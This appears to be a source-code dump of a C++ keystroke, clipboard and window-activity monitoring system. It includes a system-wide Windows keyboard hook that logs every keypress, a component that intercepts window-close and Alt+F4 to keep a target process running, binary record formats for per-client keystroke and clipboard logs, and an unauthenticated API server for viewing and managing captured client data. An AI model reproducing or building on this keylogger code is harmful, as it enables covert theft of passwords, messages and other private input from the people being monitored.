// // Window event (256 bytes)
// struct WindowEvent {
//     uint64_t timestamp;
//     uint32_t client_hash;
//     uint32_t padding1;
//     char title[128];
//     char process[112];
    
//     WindowEvent() {
//         memset(this, 0, sizeof(*this));
//     }
    
//     WindowEvent(uint64_t ts, uint32_t hash, const string& t, const string& p) 
//         : timestamp(ts), client_hash(hash), padding1(0) {
//         memset(title, 0, sizeof(title));
//         memset(process, 0, sizeof(process));
//         strncpy(title, t.c_str(), sizeof(title) - 1);
//         strncpy(process, p.c_str(), sizeof(process) - 1);
//     }
    
//     string getTitle() const { return string(title); }
//     string getProcess() const { return string(process); }
// };

// // B+ Tree Node (4096 bytes - page aligned)
// static const int BPLUS_ORDER = 63;

// struct BPlusTreeNode {
//     bool is_leaf;
//     uint32_t num_keys;
//     uint32_t padding1;
//     uint64_t keys[BPLUS_ORDER];              // Timestamps
//     uint64_t children[BPLUS_ORDER + 1];      // Offsets
//     uint64_t next_leaf;                      // For leaves
//     uint64_t parent_offset;                  // Parent node
//     uint8_t padding[24];
    
//     BPlusTreeNode() {
//         memset(this, 0, sizeof(*this));
//     }
// };

// // Hash table slot (256 bytes)
// struct HashTableSlot {
//     ClientRecord client;
    
//     HashTableSlot() {
//         memset(this, 0, sizeof(*this));
//     }
// };


// #pragma pack(pop)
// #endif






#ifndef DB_STRUCTURES_HPP
#define DB_STRUCTURES_HPP

#include <cstdint>
#include <cstring>
#include <string>
#include <algorithm>

using namespace std;

#pragma pack(push, 1) // EXACT binary layout, no compiler padding

// =============================================================
// DATABASE HEADER (256 BYTES EXACT)
// =============================================================
struct DatabaseHeader {
    uint32_t magic;                    // 4  : 'MEOW'
    uint32_t version;                  // 4
    uint64_t file_size;                // 8
    uint64_t client_table_offset;      // 8
    uint64_t keystroke_tree_offset;    // 8
    uint64_t clipboard_tree_offset;    // 8
    uint64_t window_tree_offset;       // 8
    uint32_t num_clients;              // 4
    uint32_t max_clients;              // 4
    uint64_t next_free_offset;         // 8
    uint8_t  padding[192];             // total = 256

    DatabaseHeader() {
        memset(this, 0, sizeof(*this));
        magic = 0x4D454F57; // 'MEOW'
        version = 1;
        file_size = 100ULL * 1024 * 1024;
        max_clients = 1000;
    }
};
static_assert(sizeof(DatabaseHeader) == 256, "DatabaseHeader must be 256 bytes");

// =============================================================
// CLIENT RECORD (256 BYTES EXACT)
// =============================================================
struct ClientRecord {
    char     client_id[64];
    uint32_t client_hash;
    uint8_t  is_active;
    uint8_t  padding1[3];
    uint32_t session_count;
    uint64_t first_seen;
    uint64_t last_seen;
    uint64_t total_keystrokes;
    uint64_t total_clipboard;
    uint64_t total_windows;
    uint64_t keystroke_tree_root;
    uint64_t clipboard_tree_root;
    uint64_t window_tree_root;
    uint8_t  padding2[116];             // total = 256

    ClientRecord() {
        memset(this, 0, sizeof(*this));
    }

    bool isEmpty() const {
        return client_id[0] == '\0';
    }

    static uint32_t hashString(const string& str) {
        uint32_t hash = 5381;
        for (char c : str) {
            hash = ((hash << 5) + hash) + (uint8_t)c;
        }
        return hash;
    }

    void setClientId(const string& id) {
        strncpy(client_id, id.c_str(), sizeof(client_id) - 1);
        client_id[sizeof(client_id) - 1] = '\0';
        client_hash = hashString(id);
    }
};
static_assert(sizeof(ClientRecord) == 256, "ClientRecord must be 256 bytes");

// =============================================================
// KEYSTROKE EVENT (64 BYTES EXACT)
// =============================================================
struct KeystrokeEvent {
    uint64_t timestamp;    // 8
    uint32_t client_hash;  // 4
    uint32_t sequence;     // 4
    char     key[48];      // 48

    KeystrokeEvent() {
        memset(this, 0, sizeof(*this));
    }

    KeystrokeEvent(uint64_t ts, uint32_t hash, const string& k)
        : timestamp(ts), client_hash(hash), sequence(0) {
        memset(key, 0, sizeof(key));
        strncpy(key, k.c_str(), sizeof(key) - 1);
    }
};
static_assert(sizeof(KeystrokeEvent) == 64, "KeystrokeEvent must be 64 bytes");

// =============================================================
// CLIPBOARD EVENT (512 BYTES EXACT)
// =============================================================
struct ClipboardEvent {
    uint64_t timestamp;        // 8
    uint32_t client_hash;      // 4
    uint32_t content_length;   // 4
    char     content[496];     // 496

    ClipboardEvent() {
        memset(this, 0, sizeof(*this));
    }

    ClipboardEvent(uint64_t ts, uint32_t hash, const string& text)
        : timestamp(ts), client_hash(hash) {
        content_length = min<size_t>(495, text.size());
        memset(content, 0, sizeof(content));
        memcpy(content, text.c_str(), content_length);
        content[content_length] = '\0';
    }
};
static_assert(sizeof(ClipboardEvent) == 512, "ClipboardEvent must be 512 bytes");

// =============================================================
// WINDOW EVENT (256 BYTES EXACT)
// =============================================================
struct WindowEvent {
    uint64_t timestamp;    // 8
    uint32_t client_hash;  // 4
    uint32_t padding1;     // 4
    char     title[128];   // 128
    char     process[112]; // 112

    WindowEvent() {
        memset(this, 0, sizeof(*this));
    }

    WindowEvent(uint64_t ts, uint32_t hash,
                const string& t, const string& p)
        : timestamp(ts), client_hash(hash), padding1(0) {
        memset(title, 0, sizeof(title));
        memset(process, 0, sizeof(process));
        strncpy(title, t.c_str(), sizeof(title) - 1);
        strncpy(process, p.c_str(), sizeof(process) - 1);
    }
};
static_assert(sizeof(WindowEvent) == 256, "WindowEvent must be 256 bytes");

// =============================================================
// B+ TREE NODE (4096 BYTES EXACT â€” DISK PAGE)
// =============================================================
static const int BPLUS_ORDER = 63;

struct BPlusTreeNode {
    bool     is_leaf;                      // 1
    uint8_t  padding1[3];                  // 3
    uint32_t num_keys;                     // 4
    uint64_t keys[BPLUS_ORDER];            // 504
    uint64_t children[BPLUS_ORDER + 1];    // 512
    uint64_t next_leaf;                    // 8
    uint64_t parent_offset;                // 8
    uint8_t  padding2[3056];               // total = 4096

    BPlusTreeNode() {
        memset(this, 0, sizeof(*this));
    }
};
static_assert(sizeof(BPlusTreeNode) == 4096, "BPlusTreeNode must be 4096 bytes");

// =============================================================
// HASH TABLE SLOT (256 BYTES EXACT)
// =============================================================
struct HashTableSlot {
    ClientRecord client;
};
static_assert(sizeof(HashTableSlot) == 256, "HashTableSlot must be 256 bytes");

#pragma pack(pop)

#endif // DB_STRUCTURES_HPP


===== FILE: ./keyboard_capture_windows.hpp =====

#ifndef KEYBOARD_CAPTURE_WINDOWS_HPP
#define KEYBOARD_CAPTURE_WINDOWS_HPP

#ifdef PLATFORM_WINDOWS

#include <windows.h>
#include <string>
#include <thread>
#include <atomic>
#include <functional>
#include <unordered_map>
#include <iostream>
using namespace std; 
class KeyboardCaptureWindows {
private:
      atomic<bool> capturing_;
      thread capture_thread_;
      function<void(const   string&)> callback_;
    static KeyboardCaptureWindows* instance_;
    static HHOOK hook_handle_;

public:
    KeyboardCaptureWindows(  function<void(const   string&)> callback) 
        : capturing_(false), callback_(callback) {
        instance_ = this;
    }

    ~KeyboardCaptureWindows() {
        stop();
        instance_ = nullptr;
    }

    bool start() {
        if (capturing_) {
            return false;
        }

        capturing_ = true;
        capture_thread_ =   thread(&KeyboardCaptureWindows::captureLoop, this);
        return true;
    }

    void stop() {
        capturing_ = false;
        if (hook_handle_) {
            UnhookWindowsHookEx(hook_handle_);
            hook_handle_ = nullptr;
        }
        if (capture_thread_.joinable()) {
            capture_thread_.join();
        }
    }

    bool isCapturing() const {
        return capturing_;
    }

      string getKeyboardDevice() const {
        return "Windows Keyboard Hook";
    }

private:
    static LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
        if (nCode >= 0 && instance_) {
            if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
                KBDLLHOOKSTRUCT* pKeyboard = (KBDLLHOOKSTRUCT*)lParam;
                  string key_name = instance_->vkCodeToString(pKeyboard->vkCode);
                
                if (!key_name.empty() && instance_->callback_) {
                      cout << "Captured key: " << key_name <<   endl;
                    instance_->callback_(key_name);
                }
            }
        }
        return CallNextHookEx(hook_handle_, nCode, wParam, lParam);
    }

    void captureLoop() {
          cout << "Starting Windows keyboard capture..." <<   endl;
         
        hook_handle_ = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
        if (!hook_handle_) {
              cerr << "Failed to install keyboard hook!" <<   endl;
            return;
        }

          cout << "âœ“ Keyboard hook installed. Capturing keystrokes..." <<   endl;

        MSG msg;
        while (capturing_ && GetMessage(&msg, NULL, 0, 0)) {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
    }

      string vkCodeToString(DWORD vkCode) {
        static const   unordered_map<DWORD,   string> key_map = {
            {'A', "A"}, {'B', "B"}, {'C', "C"}, {'D', "D"}, {'E', "E"},
            {'F', "F"}, {'G', "G"}, {'H', "H"}, {'I', "I"}, {'J', "J"},
            {'K', "K"}, {'L', "L"}, {'M', "M"}, {'N', "N"}, {'O', "O"},
            {'P', "P"}, {'Q', "Q"}, {'R', "R"}, {'S', "S"}, {'T', "T"},
            {'U', "U"}, {'V', "V"}, {'W', "W"}, {'X', "X"}, {'Y', "Y"},
            {'Z', "Z"},
            {'0', "0"}, {'1', "1"}, {'2', "2"}, {'3', "3"}, {'4', "4"},
            {'5', "5"}, {'6', "6"}, {'7', "7"}, {'8', "8"}, {'9', "9"},
            {VK_SPACE, "SPACE"}, {VK_RETURN, "ENTER"}, {VK_BACK, "BACKSPACE"},
            {VK_TAB, "TAB"}, {VK_ESCAPE, "ESC"}, {VK_CONTROL, "CTRL"},
            {VK_SHIFT, "SHIFT"}, {VK_MENU, "ALT"},
            {VK_OEM_COMMA, ","}, {VK_OEM_PERIOD, "."}, {VK_OEM_2, "/"}, 
            {VK_OEM_1, ";"}, {VK_OEM_7, "'"}, {VK_OEM_4, "["}, 
            {VK_OEM_6, "]"}, {VK_OEM_5, "\\"}, {VK_OEM_MINUS, "-"}, 
            {VK_OEM_PLUS, "="}, {VK_OEM_3, "`"},
            {VK_UP, "UP"}, {VK_DOWN, "DOWN"}, {VK_LEFT, "LEFT"}, {VK_RIGHT, "RIGHT"},
            {VK_F1, "F1"}, {VK_F2, "F2"}, {VK_F3, "F3"}, {VK_F4, "F4"},
            {VK_F5, "F5"}, {VK_F6, "F6"}, {VK_F7, "F7"}, {VK_F8, "F8"},
            {VK_F9, "F9"}, {VK_F10, "F10"}, {VK_F11, "F11"}, {VK_F12, "F12"}
        };

        auto it = key_map.find(vkCode);
        if (it != key_map.end()) {
            return it->second;
        }
        return "KEY_" +   to_string(vkCode);
    }
};

KeyboardCaptureWindows* KeyboardCaptureWindows::instance_ = nullptr;
HHOOK KeyboardCaptureWindows::hook_handle_ = nullptr;

#endif // PLATFORM_WINDOWS
#endif

===== FILE: ./platform_detector.hpp =====


#ifndef PLATFORM_DETECTOR_HPP
#define PLATFORM_DETECTOR_HPP

// Platform detection macros
#if defined(_WIN32) || defined(_WIN64)
    #define PLATFORM_WINDOWS
#elif defined(__linux__)
    #define PLATFORM_LINUX
#else
    #error "Unsupported platform"
#endif

#endif

===== FILE: ./window_protector.hpp =====

#ifndef WINDOW_PROTECTOR_HPP
#define WINDOW_PROTECTOR_HPP

#ifdef PLATFORM_WINDOWS

#include <windows.h>
#include <tlhelp32.h>
#include <string>
#include <vector>
#include <iostream>
#include <atomic>
#include <thread>
#include <unordered_set>
#include "password_dialog_windows.hpp"
using namespace std; 

class WindowProtector {
private: 
    DWORD targetPID;
      atomic<bool> protecting_;
      thread protectionThread_;
      unordered_set<HWND> hookedWindows_;
    HHOOK keyboardHook_;
    static WindowProtector* instance_;
    static   atomic<bool>* exit_authorized_ptr_;
    
    // Store original window procedures
    static   unordered_map<HWND, WNDPROC> originalProcs_;
    
public:
    WindowProtector(DWORD pid,   atomic<bool>& exit_auth) 
        : targetPID(pid), protecting_(false), keyboardHook_(NULL) {
        instance_ = this;
        exit_authorized_ptr_ = &exit_auth;
    }
    
    ~WindowProtector() {
        stop();
        instance_ = nullptr;
    }
    
    bool start() {
        if (protecting_) return false;
        
        protecting_ = true;
        
        // Install global keyboard hook for Alt+F4
        keyboardHook_ = SetWindowsHookExA(WH_KEYBOARD_LL, KeyboardHookProc, 
                                          GetModuleHandleA(NULL), 0);
        
        if (!keyboardHook_) {
              cerr << "âš ï¸  Failed to install keyboard hook" <<   endl;
        }
        
        // Start window monitoring thread
        protectionThread_ =   thread(&WindowProtector::protectionLoop, this);
        
          cout << "ðŸ›¡ï¸  Window protection active - monitoring PID " << targetPID <<   endl;
        return true;
    }
    
    void stop() {
        protecting_ = false;
        
        if (keyboardHook_) {
            UnhookWindowsHookEx(keyboardHook_);
            keyboardHook_ = NULL;
        }
        
        // Restore original window procedures
        for (auto& pair : originalProcs_) {
            SetWindowLongPtrA(pair.first, GWLP_WNDPROC, (LONG_PTR)pair.second);
        }
        originalProcs_.clear();
        
        if (protectionThread_.joinable()) {
            protectionThread_.join();
        }
    }
    
private:
    void protectionLoop() {
        while (protecting_) {
            // Find all windows belonging to target process
            findAndHookWindows();
              this_thread::sleep_for(  chrono::milliseconds(500));
        }
    }
    
    void findAndHookWindows() {
        EnumWindows([](HWND hwnd, LPARAM lParam) -> BOOL {
            WindowProtector* self = (WindowProtector*)lParam;
            
            DWORD windowPID;
            GetWindowThreadProcessId(hwnd, &windowPID);
            
            if (windowPID == self->targetPID) {
                // Check if this window is already hooked
                if (self->hookedWindows_.find(hwnd) == self->hookedWindows_.end()) {
                    self->hookWindow(hwnd);
                }
            }
            
            return TRUE;
        }, (LPARAM)this);
    }
    
    void hookWindow(HWND hwnd) {
        // Only hook top-level visible windows
        if (!IsWindowVisible(hwnd)) return;
        if (GetWindow(hwnd, GW_OWNER) != NULL) return;
        
        char className[256];
        GetClassNameA(hwnd, className, sizeof(className));
        
        // Skip system windows
        if (strcmp(className, "IME") == 0) return;
        if (strcmp(className, "MSCTFIME UI") == 0) return;
        
        // Subclass the window
        WNDPROC originalProc = (WNDPROC)GetWindowLongPtrA(hwnd, GWLP_WNDPROC);
        
        if (originalProc && originalProc != ProtectedWindowProc) {
            originalProcs_[hwnd] = originalProc;
            SetWindowLongPtrA(hwnd, GWLP_WNDPROC, (LONG_PTR)ProtectedWindowProc);
            SetWindowLongPtrA(hwnd, GWLP_USERDATA, (LONG_PTR)this);
            
            hookedWindows_.insert(hwnd);
            
            char title[256];
            GetWindowTextA(hwnd, title, sizeof(title));
              cout << "ðŸ”’ Protected window: " << (title[0] ? title : className) 
                      << " (HWND: " << hwnd << ")" <<   endl;
        }
    }
    
    static LRESULT CALLBACK ProtectedWindowProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
        // Get original procedure
        WNDPROC originalProc = nullptr;
        auto it = originalProcs_.find(hwnd);
        if (it != originalProcs_.end()) {
            originalProc = it->second;
        }
        
        // Intercept close messages
        if (msg == WM_CLOSE) {
              cout << "\nðŸš¨ Window close attempt intercepted!" <<   endl;
            
            if (instance_ && exit_authorized_ptr_) {
                if (instance_->handleCloseAttempt(hwnd)) {
                    // Password correct - allow close
                    if (originalProc) {
                        return CallWindowProcA(originalProc, hwnd, msg, wParam, lParam);
                    }
                } else {
                    // Password incorrect - block close
                    return 0;
                }
            }
            return 0;
        }
        
        // Intercept system commands (Alt+F4, etc.)
        if (msg == WM_SYSCOMMAND) {
            if (wParam == SC_CLOSE) {
                  cout << "\nðŸš¨ System close command intercepted!" <<   endl;
                
                if (instance_ && exit_authorized_ptr_) {
                    if (!instance_->handleCloseAttempt(hwnd)) {
                        return 0; // Block
                    }
                }
            }
        }
        
        // Call original window procedure
        if (originalProc) {
            return CallWindowProcA(originalProc, hwnd, msg, wParam, lParam);
        }
        
        return DefWindowProcA(hwnd, msg, wParam, lParam);
    }
    
    bool handleCloseAttempt(HWND hwnd) {
        char title[256];
        GetWindowTextA(hwnd, title, sizeof(title));
        
          cout << "ðŸ” Password required to close: " << title <<   endl;
        
        if (PasswordDialogWindows::showPasswordDialog()) {
              cout << "âœ… Password correct - Close authorized" <<   endl;
            
            if (exit_authorized_ptr_) {
                *exit_authorized_ptr_ = true;
            }
            
            return true;
        } else {
              cout << "âŒ Incorrect password - Close blocked\n" <<   endl;
            return false;
        }
    }
    
    static LRESULT CALLBACK KeyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam) {
        if (nCode >= 0 && instance_) {
            if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
                KBDLLHOOKSTRUCT* kbd = (KBDLLHOOKSTRUCT*)lParam;
                
                // Check for Alt+F4
                if (kbd->vkCode == VK_F4 && (GetAsyncKeyState(VK_MENU) & 0x8000)) {
                    // Check if the foreground window belongs to our process
                    HWND fgWindow = GetForegroundWindow();
                    DWORD fgPID;
                    GetWindowThreadProcessId(fgWindow, &fgPID);
                    
                    if (fgPID == instance_->targetPID) {
                          cout << "\nðŸš¨ Alt+F4 intercepted!" <<   endl;
                        
                        if (!instance_->handleCloseAttempt(fgWindow)) {
                            return 1; // Block Alt+F4
                        }
                    }
                }
            }
        }
        
        return CallNextHookEx(instance_->keyboardHook_, nCode, wParam, lParam);
    }
};

WindowProtector* WindowProtector::instance_ = nullptr;
  atomic<bool>* WindowProtector::exit_authorized_ptr_ = nullptr;
  unordered_map<HWND, WNDPROC> WindowProtector::originalProcs_;

#endif // PLATFORM_WINDOWS
#endif

===== FILE: ./Server/api_server.hpp =====

#ifndef API_SERVER_HPP
#define API_SERVER_HPP

#include <iostream>
#include <string>
#include <thread>
#include <atomic>
#include <mutex>
#include <queue>
#include <condition_variable>
#include <functional>
#include <sstream>
#include <cstring>
#include <vector>
#include <map>
#include <algorithm>
#include <regex>
#include<fcntl.h>

#ifdef _WIN32
#include <winsock2.h>
#include <ws2tcpip.h>
#pragma comment(lib, "ws2_32.lib")
#else
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <signal.h>
#endif

using namespace std;

class APIServer {
private:
    int port_;
    int server_socket_;
    atomic<bool> running_;
    thread server_thread_;
    
    // Command handling
    mutex command_mutex_;
    queue<string> command_queue_;
    condition_variable command_cv_;
    
    // Response storage
    struct CommandResult {
        string output;
        bool ready;
    };
    map<string, CommandResult> command_results_;
    mutex results_mutex_;
    
    // Helper function to extract JSON value
    string extractJSONValue(const string& json, const string& key) {
        string pattern = "\"" + key + "\":\\s*\"([^\"]*)\"";
        regex reg(pattern);
        smatch match;
        
        if (regex_search(json, match, reg) && match.size() > 1) {
            return match[1].str();
        }
        
        // Try without quotes for value
        pattern = "\"" + key + "\":\\s*([^,}\\s]+)";
        regex reg2(pattern);
        if (regex_search(json, match, reg2) && match.size() > 1) {
            return match[1].str();
        }
        
        return "";
    }
    
    void handleClient(int client_socket) {
        char buffer[4096];
        string request_data;
        
        while (running_) {
            memset(buffer, 0, sizeof(buffer));
            int bytes_received = recv(client_socket, buffer, sizeof(buffer) - 1, 0);
            
            if (bytes_received <= 0) {
                break;
            }
            
            buffer[bytes_received] = '\0';
            request_data += string(buffer);
            
            // Check if we have complete request
            if (request_data.find('\n') != string::npos || 
                (request_data.find('{') != string::npos && 
                 request_data.find('}') != string::npos)) {
                
                // Log the raw request for debugging
                cout << "ðŸ“¥ API Request: " << request_data.substr(0, 200) << endl;
                
                string response = processJSONRequest(request_data);
                cout << "ðŸ“¤ API Response: " << response.substr(0, 200) << endl;
                
                send(client_socket, response.c_str(), response.size(), 0);
                
                // Clear for next request
                request_data.clear();
            }
        }
        
#ifdef _WIN32
        closesocket(client_socket);
#else
        close(client_socket);
#endif
    }
    
    string processJSONRequest(const string& request) {
        // Simple JSON parser using regex
        string command = extractJSONValue(request, "command");
        string client_id = extractJSONValue(request, "client_id");
        string data_type = extractJSONValue(request, "type");
        
        cout << "ðŸ” Parsed JSON: command='" << command 
             << "', client_id='" << client_id 
             << "', type='" << data_type << "'" << endl;
        
        // Handle ping command
        if (command == "ping") {
            return "{\"status\":\"success\",\"message\":\"API server running\",\"timestamp\":\"" + to_string(time(nullptr)) + "\"}\n";
        }
        
        // Build command string for main server
        string cmd_str;
        if (command == "list") {
            cmd_str = "list";
        } else if (command == "clients") {
            cmd_str = "clients";
        } else if (command == "accept" && !client_id.empty()) {
            cmd_str = "accept " + client_id;
        } else if (command == "reject" && !client_id.empty()) {
            cmd_str = "reject " + client_id;
        } else if (command == "kick" && !client_id.empty()) {
            cmd_str = "kick " + client_id;
        } else if (command == "delete" && !client_id.empty()) {
            cmd_str = "delete " + client_id;
        } else if (command == "flush") {
            cmd_str = "flush";
        } else if (command == "stats") {
            cmd_str = "stats";
        } else if (command == "view" && !client_id.empty()) {
            cmd_str = "view " + client_id + " " + (data_type.empty() ? "all" : data_type);
        } else if (command == "quit") {
            cmd_str = "quit";
        } else {
            cout << "âŒ Invalid command received: '" << command << "'" << endl;
            return "{\"status\":\"error\",\"message\":\"Invalid command: " + command + "\"}\n";
        }
        
        // Generate unique command ID
        string cmd_id = to_string(time(nullptr)) + "_" + to_string(rand() % 10000);
        
        // Store empty result
        {
            lock_guard<mutex> lock(results_mutex_);
            command_results_[cmd_id] = {"", false};
        }
        
        // Queue command with ID
        {
            lock_guard<mutex> lock(command_mutex_);
            command_queue_.push(cmd_id + ":" + cmd_str);
            cout << "ðŸ“‹ Command queued: " << cmd_id << ":" << cmd_str << endl;
        }
        command_cv_.notify_one();
        
        // Wait for result (with timeout)
        for (int i = 0; i < 100; i++) { // 10 second timeout
            this_thread::sleep_for(chrono::milliseconds(100));
            
            {
                lock_guard<mutex> lock(results_mutex_);
                if (command_results_.find(cmd_id) != command_results_.end() && 
                    command_results_[cmd_id].ready) {
                    string result = command_results_[cmd_id].output;
                    command_results_.erase(cmd_id);
                    
                    // Convert command output to JSON
                    cout << "âœ… Command completed: " << cmd_str << endl;
                    return formatOutputAsJSON(command, result, cmd_str);
                }
            }
        }
        
        // Timeout
        {
            lock_guard<mutex> lock(results_mutex_);
            command_results_.erase(cmd_id);
        }
        
        cout << "â° Command timeout: " << cmd_str << endl;
        return "{\"status\":\"error\",\"message\":\"Command timeout: " + command + "\"}\n";
    }
    
    string formatOutputAsJSON(const string& command, const string& output, const string& full_cmd = "") {
        stringstream json;
        
        // Start JSON
        json << "{\"status\":\"success\",\"command\":\"" << command << "\"";
        
        // Add the raw output as an array of lines
        vector<string> lines;
        istringstream stream(output);
        string line;
        
        while (getline(stream, line)) {
            // Remove trailing \r if present
            if (!line.empty() && line.back() == '\r') {
                line.pop_back();
            }
            if (!line.empty()) {
                lines.push_back(line);
            }
        }
        
        // Add data array
        if (!lines.empty()) {
            json << ",\"data\":[";
            for (size_t i = 0; i < lines.size(); ++i) {
                if (i > 0) json << ",";
                
                // Escape special JSON characters
                string escaped_line;
                for (char c : lines[i]) {
                    switch (c) {
                        case '"': escaped_line += "\\\""; break;
                        case '\\': escaped_line += "\\\\"; break;
                        case '\b': escaped_line += "\\b"; break;
                        case '\f': escaped_line += "\\f"; break;
                        case '\n': escaped_line += "\\n"; break;
                        case '\r': escaped_line += "\\r"; break;
                        case '\t': escaped_line += "\\t"; break;
                        default: escaped_line += c;
                    }
                }
                json << "\"" << escaped_line << "\"";
            }
            json << "]";
        } else {
            json << ",\"data\":[]";
        }
        
        // Add raw output for debugging
        json << ",\"raw\":\"";
        for (char c : output) {
            switch (c) {
                case '"': json << "\\\""; break;
                case '\\': json << "\\\\"; break;
                case '\n': json << "\\n"; break;
                case '\r': json << "\\r"; break;
                case '\t': json << "\\t"; break;
                default: json << c;
            }
        }
        json << "\"";
        
        json << "}";
        
        return json.str() + "\n";
    }
    
    void runServer() {
#ifdef _WIN32
        WSADATA wsaData;
        if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
            cerr << "WSAStartup failed" << endl;
            return;
        }
#endif

        server_socket_ = socket(AF_INET, SOCK_STREAM, 0);
        if (server_socket_ < 0) {
            cerr << "Failed to create socket" << endl;
            return;
        }
        
        // Set socket options
        int opt = 1;
        setsockopt(server_socket_, SOL_SOCKET, SO_REUSEADDR, (char*)&opt, sizeof(opt));
        
        // Set non-blocking (optional)
#ifdef _WIN32
        u_long mode = 1;
        ioctlsocket(server_socket_, FIONBIO, &mode);
#else
        int flags = fcntl(server_socket_, F_GETFL, 0);
        fcntl(server_socket_, F_SETFL, flags | O_NONBLOCK);
#endif
        
        sockaddr_in server_addr{};
        server_addr.sin_family = AF_INET;
        server_addr.sin_addr.s_addr = INADDR_ANY;
        server_addr.sin_port = htons(port_);
        
        if (bind(server_socket_, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
            cerr << "âŒ Bind failed on port " << port_ << " (error: " << errno << ")" << endl;
            return;
        }
        
        if (listen(server_socket_, 10) < 0) {
            cerr << "Listen failed" << endl;
            return;
        }
        
        cout << "âœ… JSON API Server listening on port " << port_ << endl;
        
        while (running_) {
            sockaddr_in client_addr{};
            socklen_t client_len = sizeof(client_addr);
            
            int client_socket = accept(server_socket_, (struct sockaddr*)&client_addr, &client_len);
            
            if (client_socket < 0) {
                if (running_) {
#ifdef _WIN32
                    if (WSAGetLastError() == WSAEWOULDBLOCK)
#else
                    if (errno == EAGAIN || errno == EWOULDBLOCK)
#endif
                    {
                        this_thread::sleep_for(chrono::milliseconds(100));
                        continue;
                    }
                }
                continue;
            }
            
            // Handle client in separate thread
            thread([this, client_socket]() {
                handleClient(client_socket);
            }).detach();
        }
        
#ifdef _WIN32
        closesocket(server_socket_);
        WSACleanup();
#else
        close(server_socket_);
#endif
        
        cout << "API Server stopped" << endl;
    }

public:
    APIServer(int port = 3002) : port_(port), server_socket_(-1), running_(false) {}
    
    ~APIServer() {
        stop();
    }
    
    void start() {
        if (running_) return;
        running_ = true;
        server_thread_ = thread(&APIServer::runServer, this);
        
        // Give server time to start
        this_thread::sleep_for(chrono::milliseconds(500));
    }
    
    void stop() {
        running_ = false;
        
        if (server_socket_ >= 0) {
#ifdef _WIN32
            closesocket(server_socket_);
#else
            shutdown(server_socket_, SHUT_RDWR);
            close(server_socket_);
#endif
            server_socket_ = -1;
        }
        
        if (server_thread_.joinable()) {
            server_thread_.join();
        }
    }
    
    // Get next command from queue
    string getNextCommand(int timeout_ms = 100) {
        unique_lock<mutex> lock(command_mutex_);
        
        if (command_cv_.wait_for(lock, chrono::milliseconds(timeout_ms), [this]() {
            return !command_queue_.empty();
        })) {
            string cmd = command_queue_.front();
            command_queue_.pop();
            cout << "ðŸ“¨ Processing command from queue: " << cmd << endl;
            return cmd;
        }
        
        return "";
    }
    
    // Store command result
    void storeResult(const string& cmd_id, const string& output) {
        lock_guard<mutex> lock(results_mutex_);
        if (command_results_.find(cmd_id) != command_results_.end()) {
            cout << "ðŸ’¾ Storing result for command ID: " << cmd_id 
                 << " (length: " << output.length() << ")" << endl;
            command_results_[cmd_id] = {output, true};
        } else {
            cout << "âš ï¸  Command ID not found for result: " << cmd_id << endl;
        }
    }
    
    // Debug: Print queue status
    void debugPrintQueue() {
        lock_guard<mutex> lock(command_mutex_);
        cout << "ðŸ“Š Command queue size: " << command_queue_.size() << endl;
    }
};

#endif

===== FILE: ./Server/events.hpp =====

// #ifndef EVENTS_HPP
// #define EVENTS_HPP

// #include <cstdint>
// #include <cstring>
// #include <string>
// #include <chrono>
// #include <openssl/sha.h>

// using namespace std;

// inline uint64_t getCurrentTimestamp() {
//     return chrono::duration_cast<chrono::microseconds>(
//         chrono::system_clock::now().time_since_epoch()
//     ).count();
// }

// enum class EventType : uint8_t {
//     KEYSTROKE = 1,
//     CLIPBOARD = 2,
//     WINDOW = 3
// };

// // Keystroke event (32 bytes fixed)
// struct KeystrokeEvent {
//     uint64_t timestamp;
//     char key[16];
//     uint32_t sequence;
//     uint32_t padding;
    
//     KeystrokeEvent() : timestamp(0), sequence(0), padding(0) {
//         memset(key, 0, sizeof(key));
//     }
    
//     KeystrokeEvent(const string& key_str, uint32_t seq) 
//         : timestamp(getCurrentTimestamp()), sequence(seq), padding(0) {
//         memset(key, 0, sizeof(key));
//         strncpy(key, key_str.c_str(), sizeof(key) - 1);
//     }
    
//     string getKey() const {
//         return string(key);
//     }
// };

// // Clipboard event (10,304 bytes fixed)
// struct ClipboardEvent {
//     uint64_t timestamp;
//     uint32_t content_length;
//     uint8_t hash[32];
//     char content[10240];
//     uint32_t padding;
    
//     ClipboardEvent() : timestamp(0), content_length(0), padding(0) {
//         memset(hash, 0, sizeof(hash));
//         memset(content, 0, sizeof(content));
//     }
    
//     ClipboardEvent(const string& text) 
//         : timestamp(getCurrentTimestamp()), padding(0) {
//         content_length = min((size_t)10240, text.size());
//         memset(content, 0, sizeof(content));
//         memcpy(content, text.c_str(), content_length);
        
//         SHA256_CTX sha256;
//         SHA256_Init(&sha256);
//         SHA256_Update(&sha256, text.c_str(), text.size());
//         SHA256_Final(hash, &sha256);
//     }
    
//     string getContent() const {
//         return string(content, content_length);
//     }
// };

// // Window event (328 bytes fixed)
// struct WindowEvent {
//     uint64_t timestamp;
//     char title[256];
//     char process[64];
//     uint32_t padding;
    
//     WindowEvent() : timestamp(0), padding(0) {
//         memset(title, 0, sizeof(title));
//         memset(process, 0, sizeof(process));
//     }
    
//     WindowEvent(const string& win_title, const string& proc_name) 
//         : timestamp(getCurrentTimestamp()), padding(0) {
//         memset(title, 0, sizeof(title));
//         memset(process, 0, sizeof(process));
//         strncpy(title, win_title.c_str(), sizeof(title) - 1);
//         strncpy(process, proc_name.c_str(), sizeof(process) - 1);
//     }
    
//     string getTitle() const {
//         return string(title);
//     }
    
//     string getProcess() const {
//         return string(process);
//     }
// };

// inline EventType parseEventType(const string& message) {
//     if (message.find("KEY: ") == 0) return EventType::KEYSTROKE;
//     else if (message.find("CLIPBOARD: ") == 0) return EventType::CLIPBOARD;
//     else if (message.find("WINDOW: ") == 0) return EventType::WINDOW;
//     return EventType::KEYSTROKE;
// }

// inline string extractEventData(const string& message) {
//     size_t pos = message.find(": ");
//     if (pos != string::npos) {
//         return message.substr(pos + 2);
//     }
//     return message;
